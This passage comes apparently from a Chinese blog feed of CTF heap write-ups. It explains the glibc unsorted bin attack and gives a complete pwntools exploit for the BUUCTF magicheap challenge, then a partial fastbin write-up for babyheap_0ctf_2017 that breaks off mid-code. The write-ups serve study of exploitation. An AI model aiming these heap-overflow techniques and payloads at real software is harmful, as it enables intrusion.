&lt;p&gt;Unsorted Bin Attack 从字面上就可以看出，正合适一种针对 Unsorted Bin 机制的攻击手法。这种攻击手法实现的前提是能够控制挂进 unsorted bin 中的 chunk 的 bk 指针，在控制 bk 指针的情况下可以实现修改任意地址值为一个较大的数值&lt;/p&gt;
&lt;p&gt;首先没有 chunk 挂入的时候 unsorted bin 的 fd 和 bk 指向自己&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511195726092.png&#34; alt=&#34;image-20230511195726092&#34;&gt;&lt;/p&gt;
&lt;p&gt;如果有一个 chunk 进入 unsorted bin 时那么该春 chunk 的 fd 和 bk 都会指向 unsorted bin&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511200319409.png&#34; alt=&#34;image-20230511200319409&#34;&gt;&lt;/p&gt;
&lt;p&gt;fd 和 bk 指向 unsortedbin 的头&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511200339778.png&#34; alt=&#34;image-20230511200339778&#34;&gt;&lt;/p&gt;
&lt;p&gt;如果你修改 chunk400 的 bk 为 magic-0x10  也就是你 free 之后的 chunk_400 的 bk 为 magic-0x10 那么你就可以修改 magic 的值为较大值&lt;/p&gt;
&lt;p&gt;为什么减去 0x10  因为 magic 的地址是 magic 的存储地址  而减去 0x10 之后的值才是 magic 的 malloc 之后的头地址  也就是 prev_size 的地址&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511202116589.png&#34; alt=&#34;image-20230511202116589&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后你重新申请一个堆块  假设 chunk_400 的大小为 0x80  那么你重新申请一个 0x80 大小的堆块  就会把 chunl_400 申请走&lt;/p&gt;
&lt;p&gt;然后 magic-0x10 的这个堆块还在 那么 unsorted bin 的 fd 和 bk 就会指向 magic-0x10 的地方  然后 magic-0x10 的 fd 指针也就是 magic&lt;/p&gt;
&lt;p&gt;就会指向 unsorted bin  同时 magic 的值就会改变为较大的值&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511203517278.png&#34; alt=&#34;image-20230511203517278&#34;&gt;&lt;/p&gt;
&lt;p&gt;修改前 chunk2 的 fd 和 bk 指向 unsorted bin 的头&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511203637349.png&#34; alt=&#34;image-20230511203637349&#34;&gt;&lt;/p&gt;
&lt;p&gt;修改后 chunk2 的 bk 指向 0x602090 也就是 magic-0x10 处   magic 为 0x6020c0&lt;/p&gt;
&lt;p&gt;这个是修改前的 0x6020c0 的大小&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511204039362.png&#34; alt=&#34;image-20230511204039362&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230511212336461.png&#34; alt=&#34;image-20230511212336461&#34;&gt;&lt;/p&gt;
&lt;p&gt;这个是修改后的 0x6020c0 的大小&lt;/p&gt;
&lt;p&gt;add (0x80,‘dddd’)  只有申请一个新的堆块之后才能修改 magic 的值&lt;/p&gt;
&lt;p&gt;具体看前面  已经说过了&lt;/p&gt;
&lt;p&gt;buuctf hitcontraining_magicheap&lt;/p&gt;
&lt;p&gt;// 题目的 magic 地址为 0x6020c0  但是打远程的时候是 0x6020a0 不清楚为什么&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230509142800500.png&#34; alt=&#34;image-20230509142800500&#34;&gt;&lt;/p&gt;
&lt;p&gt;没有限制输入的数组大小所以存在堆溢出&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230509142849458.png&#34; alt=&#34;image-20230509142849458&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# r=process(&#34;1&#34;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;r &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; remote&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;node4.buuoj.cn&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;26699&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;size&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;content&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;1&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Heap : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;size&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;heap:&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;content&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;edit&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;size&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;content&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;2&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Index :&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Heap : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;size&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;heap : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;content&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;delete&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;3&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Index :&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;add&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x30&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;aaaa&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;add&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x80&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;bbbb&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;add&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x30&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;cccc&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;delete&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;magic &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x6020A0&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt;magic的地址  附件估计错了&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x30&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x91&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;magic&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;edit&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;add&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x80&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;dddd&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendlineafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;:&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;4869&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# gdb.attach(r)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;# pause()&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</content>
        <updated>2023-05-11T13:26:54.000Z</updated>
    </entry>
    <entry>
        <id>http://example.com/2023/04/17/Fastbin%20Attack/</id>
        <title>BUUCTF babyheap_0ctf_2017</title>
        <link rel="alternate" href="http://example.com/2023/04/17/Fastbin%20Attack/"/>
        <content type="html">&lt;h2 id=&#34;buuctf-babyheap_0ctf_2017&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#buuctf-babyheap_0ctf_2017&#34;&gt;#&lt;/a&gt; BUUCTF babyheap_0ctf_2017&lt;/h2&gt;
&lt;p&gt;首先申请了 4 个堆  然后 free (1) 和 free (2) 接着修改 #2 的 fd 指向 #4 所在的位置  制造出 #4 被 free 的假象&lt;/p&gt;
&lt;p&gt;然后修改 #4 的 size 位来避开 malloc 的检查。因为我们之后想在 chunk4 的地方重新 malloc&lt;/p&gt;
&lt;p&gt;但是 malloc 的时候会检查 size 是否和要分配的大小相同，这就是为什么上面代码中我们要把 chunk4 的 size 位修改为 0x21&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230415220317229.png&#34; alt=&#34;image-20230415220317229&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后重新申请了&lt;/p&gt;
&lt;p&gt;allocate(0x10)&lt;br&gt;
allocate(0x10)&lt;/p&gt;
&lt;p&gt;这里可以看一下结构体内存位置 发现下标为 1 和下标为 2 的内存全为 0 也就是都被 free 掉了&lt;/p&gt;
&lt;p&gt;所以第一个 allocate (0x10) 的内存地址指向下标为 1 的&lt;/p&gt;
&lt;p&gt;第二个 alloca (0x10) 虽然是在 #4 堆块申请了地址 但是会去到下标为 2 的结构体中  但是内存地址指向了 #4 所在的内存地址&lt;/p&gt;
&lt;p&gt;可以用这个看结构体所在位置  一般第一个就是的&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230415221026909.png&#34; alt=&#34;image-20230415221026909&#34;&gt;&lt;/p&gt;
&lt;p&gt;x/1000gx 0x321776f75000  尽量多向后找点&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230415221139838.png&#34; alt=&#34;image-20230415221139838&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230415221337737.png&#34; alt=&#34;image-20230415221337737&#34;&gt;&lt;/p&gt;
&lt;p&gt;可以看到 allocate 后下标为 2 的结构体内存地址指向堆块 #4 和下标为 4 指向的堆块一样&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x91&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;0fill&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;allocate&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x80&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;1、fill (3,payload) 其实是将 chunk4 的 size 位变为之前的 0x91&lt;br&gt;
2、allocate (0x80) 用来分割 top chunk 和 chunk4，防止堆块合并，因为我们后面要 free (4)&lt;br&gt;
 3、free (4) 之后，chunk4 会被放到 unsorted bin 中。此时 chunk4 的 fd 指针是 unsorted bin 链表的头部，这个地址为 main_arena + 0x58&lt;/p&gt;
&lt;p&gt;可以看到 0x91 那里已经 free 了所以不能 dump 输出&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416211452367.png&#34; alt=&#34;image-20230416211452367&#34;&gt;&lt;/p&gt;
&lt;p&gt;同时查看内存发现 index 为 4 那里为空证明已经被 free 了 而 index 为 2 那里的内存指向 index4 所以可以 dump 出来&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230416211534372.png&#34; alt=&#34;image-20230416211534372&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后查看结构体中的内存地址 不是堆中的 可以发现下标为 2 的内存地址指向下标为 4 的所以 dump 输出时输出下标为 2 的&lt;/p&gt;
&lt;p&gt;可以输出 chunk4 中的内容&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;dump&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;malloc_hook&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;u64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;r&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;\x7f&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;ljust&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token 